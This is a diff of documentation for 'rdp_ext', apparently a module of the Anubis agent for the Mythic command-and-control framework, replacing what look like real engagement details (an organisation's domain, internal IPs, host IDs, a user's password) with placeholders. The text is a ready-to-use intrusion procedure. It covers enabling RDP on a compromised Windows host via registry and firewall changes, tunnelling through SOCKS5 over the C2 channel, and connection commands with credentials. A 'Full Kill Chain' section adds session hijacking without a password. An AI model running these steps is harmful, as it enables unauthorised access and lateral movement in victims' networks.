@@ -29,7 +29,7 @@ Configures RDP on the **agent's own host** and provides ready-to-run connection 
 - RDP password.
 
 #### domain *(optional)*
-- Windows domain (e.g., `COPEL`).
+- Windows domain (e.g., `CORP`).
 
 #### socks_port *(optional, default: 7005)*
 - Port to open on the Mythic server for SOCKS5.
@@ -38,13 +38,13 @@ Configures RDP on the **agent's own host** and provides ready-to-run connection 
 
 ```
 ┌──────────────────────────────────────────────────────────┐
-│  Agent host (Windows — 10.12.193.4)                      │
+│  Agent host (Windows — 192.168.1.10)                     │
 │                                                          │
 │  1. registry: fDenyTSConnections = 0  (enable RDP)      │
 │  2. registry: RDP-Tcp\PortNumber    = 6000               │
 │  3. netsh:    add rule TCP/6000 inbound                  │
 │  4. SCM:      TermService stop → start (ctypes advapi32) │
-│  5. socket:   probe 10.12.193.4:6000 → REACHABLE         │
+│  5. socket:   probe 192.168.1.10:6000 → REACHABLE        │
 └──────────────────────────────────────────────────────────┘
             ↕ C2 channel (HTTP/TLS)
 ┌──────────────────────────────────────────────────────────┐
@@ -54,7 +54,7 @@ Configures RDP on the **agent's own host** and provides ready-to-run connection 
 ┌──────────────────────────────────────────────────────────┐
 │  Operator (Kali)                                         │
 │  xfreerdp /proxy:socks5://127.0.0.1:7005                 │
-│           /v:10.12.193.4:6000 /u:Administrator ...       │
+│           /v:192.168.1.10:6000 /u:Administrator ...       │
 └──────────────────────────────────────────────────────────┘
 ```
 
@@ -65,10 +65,10 @@ Configures RDP on the **agent's own host** and provides ready-to-run connection 
 rdp_ext
 
 # Com IP e credenciais
-rdp_ext 10.12.193.4 Administrator P@ssw0rd COPEL
+rdp_ext 192.168.1.10 Administrator P@ssw0rd CORP
 
 # JSON (porta customizada)
-rdp_ext {"target":"10.12.193.4","port":6000,"username":"da_silva","domain":"COPEL","password":"Senha@123"}
+rdp_ext {"target":"192.168.1.10","port":6000,"username":"jsmith","domain":"CORP","password":"P@ssw0rd"}
 ```
 
 ## Output Example
@@ -79,7 +79,7 @@ rdp_ext {"target":"10.12.193.4","port":6000,"username":"da_silva","domain":"COPE
 [+] Firewall: regra inbound TCP/6000 adicionada (AnubisRDP-6000)
 [+] TermService reiniciado e ativo na porta 6000
 
-[+] TCP 10.12.193.4:6000 — REACHABLE
+[+] TCP 192.168.1.10:6000 — REACHABLE
 [+] SOCKS5 iniciado na porta 7005 do servidor Mythic
 
 ╔══ PROXYCHAINS CONFIG ═════════════════════════════════════════╗
@@ -88,16 +88,16 @@ rdp_ext {"target":"10.12.193.4","port":6000,"username":"da_silva","domain":"COPE
 ╚═══════════════════════════════════════════════════════════════╝
 
 ── rdesktop ──────────────────────────────────────────────────────
-  proxychains rdesktop 10.12.193.4 -P 6000 -d 'COPEL' -u 'Administrator' -p 'P@ssw0rd' -g 1920x1080 -K
+  proxychains rdesktop 192.168.1.10 -P 6000 -d 'CORP' -u 'Administrator' -p 'P@ssw0rd' -g 1920x1080 -K
 
 ── xfreerdp (proxychains) ────────────────────────────────────────
-  proxychains xfreerdp /v:10.12.193.4:6000 /u:Administrator /d:COPEL /p:'P@ssw0rd' /cert-ignore +clipboard /dynamic-resolution
+  proxychains xfreerdp /v:192.168.1.10:6000 /u:Administrator /d:CORP /p:'P@ssw0rd' /cert-ignore +clipboard /dynamic-resolution
 
 ── xfreerdp (SOCKS5 nativo) ──────────────────────────────────────
-  xfreerdp /proxy:socks5://127.0.0.1:7005 /v:10.12.193.4:6000 /u:Administrator /d:COPEL /p:'P@ssw0rd' /cert-ignore +clipboard /dynamic-resolution
+  xfreerdp /proxy:socks5://127.0.0.1:7005 /v:192.168.1.10:6000 /u:Administrator /d:CORP /p:'P@ssw0rd' /cert-ignore +clipboard /dynamic-resolution
 
-[*] Usuário : COPEL\Administrator
-[*] Alvo    : 10.12.193.4:6000
+[*] Usuário : CORP\Administrator
+[*] Alvo    : 192.168.1.10:6000
 ```
 
 ## What It Configures
@@ -170,26 +170,26 @@ sudo apt install proxychains-ng
 - **Auto IP detection**: if `target` is empty, the agent calls `socket.gethostbyname(socket.gethostname())` — on multi-homed hosts, verify this returns the correct interface IP.
 - **Cleanup**: use `socks stop 7005` after the session. The firewall rule (`AnubisRDP-6000`) and port change persist — restore manually or via another `eval_code` task if needed.
 
-### Full Kill Chain (COPEL)
+### Full Kill Chain
 
 ```
-# Host comprometido: P483078 (Oracle, agente ativo)
-# Objetivo: RDP para P489039 (10.12.193.4, Win11)
+# HOST-A comprometido, Anubis ativo
+# Objetivo: RDP para HOST-B (192.168.1.10, Win11)
 
-# Fase 1 — se Anubis já está no P489039:
-rdp_ext 10.12.193.4 da_silva Senha@123 COPEL
+# Fase 1 — Anubis rodando no HOST-B como SYSTEM:
+rdp_ext 192.168.1.10 Administrator P@ssw0rd CORP
 # → configura porta 6000, firewall, reinicia TermService
-# → retorna xfreerdp /proxy:socks5://127.0.0.1:7005 /v:10.12.193.4:6000 ...
+# → retorna xfreerdp /proxy:socks5://127.0.0.1:7005 /v:192.168.1.10:6000 ...
 
 # Fase 2 — no Kali do operador:
 xfreerdp /proxy:socks5://127.0.0.1:7005 \
-  /v:10.12.193.4:6000 \
-  /u:da_silva /d:COPEL /p:'Senha@123' \
+  /v:192.168.1.10:6000 \
+  /u:Administrator /d:CORP /p:'P@ssw0rd' \
   /cert-ignore +clipboard /dynamic-resolution
 
 # Alternativa — se sessão RDP desconectada (sem credenciais):
 # 1. rdp_ext (configura porta/firewall)
-# 2. rdp_hijack 3 (hijacka sessão da_silva → acesso sem senha)
+# 2. rdp_hijack 3 (hijacka sessão desconectada → acesso sem senha)
 ```
 
 ---
